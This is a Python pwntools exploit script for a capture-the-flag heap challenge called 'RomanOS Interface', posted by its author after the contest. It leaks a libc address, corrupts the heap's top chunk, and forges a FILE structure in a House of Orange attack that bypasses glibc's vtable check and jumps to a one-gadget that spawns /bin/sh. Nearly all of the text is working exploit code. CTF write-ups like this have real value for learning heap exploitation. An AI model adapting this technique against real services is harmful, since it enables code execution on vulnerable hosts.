from pwn import *

'''
I solved this one after the ctf was over and decided to upload it because I couldnt find any write-ups on this challenge and I tested on a local server with the same libc the ctf server was using so it should work on the ctf server.
exploit doesnt always work because the libc leak isnt 100% reliable and house of orange also isnt 100% reliable
'''

r = remote('127.0.0.1', 1337)

def malloc(index, size):
	r.sendafter('4. Show info\n', '1\n')
	r.sendafter('Enter size of chunk :', str(size) + '\n')
	r.sendafter('Enter index :', str(index) + '\n')

def write(index, data):
	r.sendafter('4. Show info\n', '2\n')
	r.sendafter('Enter index of chunk :', str(index) + '\n')
	r.sendafter('Enter data :', data)

def free(index):
	r.sendafter('4. Show info\n', '3\n')
	r.sendafter('Enter index :', str(index) + '\n')

def show_info():
	r.sendafter('4. Show info\n', '4\n')
	return r.recvuntil('\nRomanOS Interface').split('\nRomanOS Interface')[0].split('Name: ')[1]

#leak libc

r.sendafter('Enter name :', 'A'*0x20)
malloc(0, 0x20000)
libc = u64(show_info()[0x20:][:6].ljust(8, '\x00')) - 0x5a4010 #the offset changes a bit so if its not correct just run the exploit again
log.success('Libc @ ' + hex(libc))

#use house of orange with vtable check bypass

malloc(0, 0x100) #malloc a chunk to initialise the top chunk and setup the top size overwrite(the previous we allocated was so big that glibc mmapped a new page for it instead of allocating a chunk on the heap page for it)
malloc(1, 0x200)
free(1)
free(0)
malloc(0, 0x110)

write(1, p64(0x0) + p64(0xee1))

malloc(0, 0x1000)

file_struct = ''
file_struct += p64(0x0)
file_struct += p64(0x1f1)
file_struct += p64(libc + 0x397b58)
file_struct += p64(libc + 0x3984f0)
file_struct += p64(0x2)
file_struct += p64(libc + 0x3f306) #rdx ; one gadget to call /bin/sh where rax needs to be null
file_struct += '\x00'*168
file_struct += p64(libc + 0x394500)
file_struct += p64(libc + 0x1180f0) #rip ; xor eax, eax ; call rdx

write(1, file_struct)

malloc(0, 0x80)

r.interactive()
